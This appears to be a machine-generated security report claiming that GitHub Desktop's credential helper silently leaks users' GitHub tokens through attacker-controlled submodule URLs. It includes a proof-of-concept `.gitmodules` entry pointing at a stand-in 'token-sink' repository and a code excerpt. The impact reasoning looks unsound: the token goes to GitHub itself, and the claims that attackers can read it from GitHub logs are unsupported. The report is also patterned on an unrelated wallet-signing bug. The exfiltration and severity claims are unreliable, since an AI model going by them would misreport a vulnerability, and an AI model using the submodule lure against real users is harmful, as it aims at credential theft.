### Title
Silent, unscoped GitHub credential disclosure to attacker-defined submodule/remote URLs via the trampoline credential helper - (File: `app/src/lib/trampoline/trampoline-credential-helper.ts`)

### Summary
GitHub Desktop's Git credential helper (`createCredentialHelperTrampolineHandler`) automatically supplies the user's stored GitHub token to *any* HTTPS request whose origin matches a signed-in account, with no per-request user confirmation and no restriction to the repository the user opened. Because Desktop auto-runs `git clone --recursive` and `git submodule update --init --recursive` for any opened/cloned repository, and `git pull`/`fetch` use `--recurse-submodules`, an attacker who controls a repository's `.gitmodules` (or a remote/proxy that rewrites URLs) can point a submodule at an arbitrary path under `github.com`/the user's GHE host and have Desktop silently authenticate that request with the victim's real token — the exact "signs/authenticates on the user's behalf without consent" pattern described in the source report, just applied to Git credential material instead of a wallet signature.

### Finding Description
The credential lookup path is:
- `createCredentialHelperTrampolineHandler` → `getCredential` → `getGitHubCredential` [1](#0-0) 
- `getGitHubCredential` derives the origin purely from the credential-protocol fields Git provides (`url`/`protocol`+`host`+`path`, see `getCredentialUrl`) and, if any signed-in account's endpoint origin matches, immediately returns that account's real token — no dialog, no logging surfaced to the user, no distinction of which repository/path is being authenticated: [2](#0-1) 
- Matching is origin-only: [3](#0-2) 
- `getCredentialUrl` builds the URL straight from what the credential-helper protocol receives from Git for the specific outgoing request (which host/path Git is currently authenticating against): [4](#0-3) 

The trigger surface is fully attacker-controlled: cloning is always done with `--recursive` [5](#0-4) , submodules are auto-initialized/updated after checkout/pull/fetch via `updateSubmodulesAfterOperation`, which unconditionally runs `submodule update --init --recursive` [6](#0-5) , and `pull`/`fetch` pass `--recurse-submodules`/`--recurse-submodules=on-demand` [7](#0-6) [8](#0-7) . None of these operations ask the user to confirm which URL will be contacted or whether their stored credential should be used for it.

This mirrors the report's broken invariant exactly: a privileged, security-sensitive action (handing over the user's real authentication secret) is performed automatically as soon as an *origin match* is observed, with the actual target (repository/path) fully controlled by untrusted, attacker-supplied repository content (`.gitmodules`) — analogous to the dapp invoking `eth_signMessage` and getting a signature back with no confirmation, origin display, or ability to reject.

### Impact Explanation
An attacker who gets a victim to clone or open a malicious repository (or add it as a dependency/submodule of an otherwise-trusted repo) can add a `.gitmodules` entry (or `insteadOf` URL rewrite) pointing at a repository/path under `github.com` or the victim's GHE host that the attacker controls or can observe (e.g., an org they can create repos in, a GitHub App/webhook they operate, or a path that logs Basic-Auth headers via GitHub Pages/Actions logs they control). Desktop will transparently authenticate that outbound request with the victim's real GitHub PAT/OAuth token, without ever showing the user which host/path is being contacted or asking for consent. This can leak the token's authenticated identity/scope to the attacker's infrastructure and enable unauthorized access using the victim's account, entirely without user awareness — a credential-exfiltration outcome directly comparable in severity to the reported "silent signing" bug.

### Likelihood Explanation
The trigger requires only that the victim open, clone, fetch, or pull a repository that references a hostile submodule URL under a GitHub domain the user is authenticated to — a very ordinary and expected workflow in GitHub Desktop, requiring no local access, no malware, and no unusual user action beyond normal repository interaction. The `--recursive`/`--recurse-submodules` flags fire automatically on every clone/fetch/pull/checkout, so the credential leak happens unconditionally as part of Desktop's standard automation, not as an edge case.

### Recommendation
Do not treat "account endpoint origin matches" as sufficient authorization to silently hand back a live token for arbitrary submodule/remote URLs discovered inside untrusted repository content. At minimum: (1) require explicit, visible confirmation (showing the exact URL/host to be contacted) before auto-initializing/updating submodules whose remote differs from the top-level repository's already-trusted remote, especially on first use; (2) treat submodule URLs sourced from `.gitmodules` in a freshly cloned/untrusted repository as requiring the same trust prompt Git itself added for `protocol.file.allow`/URL redirects; (3) scope credential handoff not just to origin but to the specific repository path(s) the user has explicitly interacted with, and log/surface every automatic credential handoff to the user, consistent with how MetaMask's fix required visible, rejectable confirmation for signing requests.

### Proof of Concept
1. Attacker publishes `evil/repo` with a `.gitmodules` file:
   ```
   [submodule "x"]
     path = x
     url = https://github.com/attacker-org/token-sink-endpoint
   ```
   (or any GitHub path the attacker controls/monitors, e.g. a private repo they can inspect access logs/Git server logs for.)
2. Victim, already signed into GitHub Desktop with a real account, clicks "Clone" (or opens a repo containing this as a nested/transitive submodule) on `evil/repo` in GitHub Desktop.
3. Desktop runs `git clone --recursive ...` [5](#0-4) , which triggers `git submodule update --init` for the `x` submodule pointing at `attacker-org/token-sink-endpoint`.
4. Git contacts `https://github.com/attacker-org/token-sink-endpoint`, invoking the trampoline credential helper; `getGitHubCredential`/`findGitHubTrampolineAccount` match on origin (`https://github.com`) and silently return the victim's real token [2](#0-1) [3](#0-2) .
5. The attacker (who controls `attacker-org/token-sink-endpoint`, e.g., through GitHub audit logs/API access logs or a repo they own) observes an authenticated request originating from the victim's token, with the victim never having seen or approved any dialog naming this destination.

export const getCredentialUrl = (cred: Map<string, string>) => {
  const u = cred.get('url')
  if (u) {
    return new URL(u)
  }

  const protocol = cred.get('protocol') ?? ''
  const username = cred.get('username')
  const user = username ? `${encodeURIComponent(username)}@` : ''
  const host = cred.get('host') ?? ''
  const path = cred.get('path') ?? ''

  return new URL(`${protocol}://${user}${host}/${path}`)
}
